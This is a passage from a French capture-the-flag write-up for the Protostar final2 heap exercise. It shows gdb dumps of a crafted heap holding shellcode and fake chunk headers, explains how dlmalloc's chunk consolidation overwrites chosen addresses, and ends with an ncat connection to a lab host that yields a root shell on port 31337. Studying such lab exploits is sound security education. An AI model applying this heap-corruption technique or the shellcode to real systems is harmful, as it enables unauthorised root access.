0x804e000:      0x00000000      0x00000089      0x44525346      0x41414141
0x804e010:      0x04e11868      0x4141c308      0x41414141      0x41414141
0x804e020:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e030:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e040:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e050:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e060:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e070:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e080:      0x522f4141      0x2f544f4f      0xfffffffc      0xfffffffd
0x804e090:      0x0804d410      0x0804e010      0x41414141      0x41414141
0x804e0a0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0b0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0c0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0d0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0e0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0f0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e100:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e110:      0x00000000      0x00000089      0xdb31c031      0x80cd17b0 <- shellcode qui commence par 0x31c031db...
0x804e120:      0xe3f7db31      0x435366b0      0x89534353      0x80cd4be1
0x804e130:      0x6652c789      0x43697a68      0xe1895366      0x515010b0
```

**Consolidation du premier chunk avec le second**

```
(gdb) x/80wx 0x0804e000
0x804e000:      0x00000000      0x00000085      0x0804d534      0x0804d534
0x804e010:      0x04e11868      0x4141c308      0x0804d410      0x41414141 <-malloc a écrit à stage1_addr+8
0x804e020:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e030:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e040:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e050:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e060:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e070:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e080:      0x522f4141      0x00000084     *0xfffffffc      0xfffffffc <- flag prev in use a été mis à 0 par malloc
0x804e090:      0x0804d410      0x0804e010      0x41414141      0x41414141
0x804e0a0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0b0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0c0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0d0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0e0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0f0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e100:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e110:      0x00000000      0x00000089      0xdb31c031      0x80cd17b0
0x804e120:      0xe3f7db31      0x435366b0      0x89534353      0x80cd4be1
0x804e130:      0x6652c789      0x43697a68      0xe1895366      0x515010b0
```

Ce qu'il s'est passé c'est que `malloc` a traité le premier chunk puis il est allé voir s'il pouvait le consolider avec le suivant.

Le second chunk est à l'adresse `0x804e088` (voir `*` dans le dump) et pour voir s'il était libre il a calculé l'adresse du troisème chunk de cette façon :

`0x804e088 + taille du chunk` soit `0x804e088 - 4` car on ment sur la vrai taille du chunk.

L'adresse obtenue correspond aux données suivantes :

```
+-- prev size--+-- size & prev in use +---- FD ----+---- BK ----+
+   0x2f544f4f +      0xfffffffc      + 0xfffffffd + 0x0804d410 +
```

`malloc` voit que le précédent chunk (le second) est libre car `0xfffffffc & 1` vaut zéro (le flag `prev in use` est à 0), il lance donc la consolidation.

Ca a pour effet d'écrire `0x0804e010` à l'adresse `0x0804d410+0xc` et `0x0804d410` à l'adresse `0x0804e010+0x8` (mécanismes FD et BK de la liste chainée).

Puis il écrit la taille du nouveau chunk libre composé des précédents chunks 1 et 2 soit `0x88 - 0x4 = 0x84`.

A ce stade tout est en place, `write` est appelé ce qui fait sauter le programme sur notre stage qui lui même saute sur notre shellcode qui nous ouvre un shell root sur le port 31337 :

```shellsession
$ ncat 192.168.56.95 31337 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.95:31337.
id
uid=0(root) gid=0(root) groups=0(root)
```

On est les champions ! On est les champions ! On est, on est, on est les champions !

D'autres writeups pour cet exercice :

[My Solution to Exploit Exercises Protostar Final2 Level - David Xia](https://www.davidxia.com/2020/11/my-solution-to-exploit-exercises-protostar-final2-level/)

[[Live] Remote oldschool dlmalloc Heap exploit - bin 0x1F - YouTube](https://www.youtube.com/watch?v=2GVi8_9u5TY)
